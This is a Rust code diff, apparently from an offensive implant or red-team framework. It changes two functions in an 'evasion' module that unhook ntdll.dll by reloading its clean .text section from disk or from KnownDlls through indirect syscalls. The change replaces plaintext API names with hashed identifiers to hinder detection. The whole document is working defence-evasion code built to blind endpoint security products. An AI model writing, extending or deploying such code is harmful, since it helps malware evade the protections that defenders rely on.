@@ -17,7 +17,8 @@ struct IoStatusBlock { status: isize, information: usize }
 
 #[cfg(target_os = "windows")]
 pub unsafe fn unhook_ntdll_disk() -> bool {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall, indirect_syscall_10};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall, indirect_syscall_10};
+    use crate::resolve::api_hash::h;
 
     let ntdll_base = resolve_ntdll_base();
     if ntdll_base.is_null() { return false; }
@@ -36,31 +37,31 @@ pub unsafe fn unhook_ntdll_disk() -> bool {
     let us = UnicodeStr { length: 66, max_length: 66, _pad: 0, buf: nt_path.as_ptr() };
     let oa = ObjAttrs { length: core::mem::size_of::<ObjAttrs>() as u32, root_dir: 0, obj_name: &us, attrs: 0x40, sec_desc: 0, sec_qos: 0 };
     let mut iosb = IoStatusBlock { status: 0, information: 0 };
-    let mut h: isize = 0;
-    let Some((ssn_open, tramp_open)) = get_ssn(b"NtOpenFile") else { return false; };
+    let mut file_h: isize = 0;
+    let Some((ssn_open, tramp_open)) = get_ssn_h(h::NT_OPEN_FILE) else { return false; };
     // FILE_READ_DATA|SYNCHRONIZE=0x00100001, ShareRead=1, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE=0x60
     let status = indirect_syscall(ssn_open, tramp_open,
-        &mut h as *mut isize as usize, 0x00100001,
+        &mut file_h as *mut isize as usize, 0x00100001,
         &oa as *const ObjAttrs as usize,
         &mut iosb as *mut IoStatusBlock as usize,
         1, 0x60);
-    if status < 0 || h == 0 { return false; }
+    if status < 0 || file_h == 0 { return false; }
 
     let mut buf = vec![0u8; 0x20_0000];
     let mut rd_iosb = IoStatusBlock { status: 0, information: 0 };
-    let Some((ssn_read, tramp_read)) = get_ssn(b"NtReadFile") else {
-        if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, h as usize, 0,0,0,0,0); }
+    let Some((ssn_read, tramp_read)) = get_ssn_h(h::NT_READ_FILE) else {
+        if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, file_h as usize, 0,0,0,0,0); }
         return false;
     };
     // NtReadFile: Handle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key
     indirect_syscall_10(ssn_read, tramp_read,
-        h as usize, 0, 0, 0,
+        file_h as usize, 0, 0, 0,
         &mut rd_iosb as *mut IoStatusBlock as usize,
         buf.as_mut_ptr() as usize,
         buf.len() as usize,
         0, 0, 0);
-    if let Some((ssn_c, tramp_c)) = get_ssn(b"NtClose") {
-        indirect_syscall(ssn_c, tramp_c, h as usize, 0, 0, 0, 0, 0);
+    if let Some((ssn_c, tramp_c)) = get_ssn_h(h::NT_CLOSE) {
+        indirect_syscall(ssn_c, tramp_c, file_h as usize, 0, 0, 0, 0, 0);
     }
 
     let disk_ntdll = buf.as_ptr();
@@ -70,7 +71,7 @@ pub unsafe fn unhook_ntdll_disk() -> bool {
     let target = ntdll_base.add(text_rva);
     let ph = usize::MAX; // -1 = current process
 
-    if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+    if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
         let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
         indirect_syscall(prot_ssn, prot_tramp, ph,
             &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
@@ -106,7 +107,8 @@ pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
 
 #[cfg(target_os = "windows")]
 pub unsafe fn unhook_ntdll_knowndlls() -> bool {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall, indirect_syscall_10};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall, indirect_syscall_10};
+    use crate::resolve::api_hash::h;
     let ntdll_base = resolve_ntdll_base();
     if ntdll_base.is_null() { return false; }
 
@@ -142,7 +144,7 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
         security_qos:  0,
     };
 
-    let Some((open_ssn, open_tramp)) = get_ssn(b"NtOpenSection") else { return false; };
+    let Some((open_ssn, open_tramp)) = get_ssn_h(h::NT_OPEN_SEC) else { return false; };
     let mut section_handle: usize = 0;
     let status = indirect_syscall(
         open_ssn, open_tramp,
@@ -153,10 +155,10 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     );
     if status != 0 || section_handle == 0 { return false; }
 
-    let nt_close_h = |h: usize| {
-        if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, h, 0, 0, 0, 0, 0); }
+    let nt_close_h = |h_val: usize| {
+        if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, h_val, 0, 0, 0, 0, 0); }
     };
-    let Some((map_ssn, map_tramp)) = get_ssn(b"NtMapViewOfSection") else {
+    let Some((map_ssn, map_tramp)) = get_ssn_h(h::NT_MAP_SEC) else {
         nt_close_h(section_handle); return false;
     };
 
@@ -179,7 +181,7 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     if text_size > 0 {
         let target = ntdll_base.add(text_rva);
         let ph = usize::MAX;
-        if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+        if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
             let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
             indirect_syscall(prot_ssn, prot_tramp, ph,
                 &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
@@ -194,7 +196,7 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
         }
     }
 
-    if let Some((unmap_ssn, unmap_tramp)) = get_ssn(b"NtUnmapViewOfSection") {
+    if let Some((unmap_ssn, unmap_tramp)) = get_ssn_h(h::NT_UNMAP_SEC) {
         indirect_syscall(unmap_ssn, unmap_tramp, usize::MAX, base_address, 0, 0, 0, 0);
     }
     nt_close_h(section_handle);
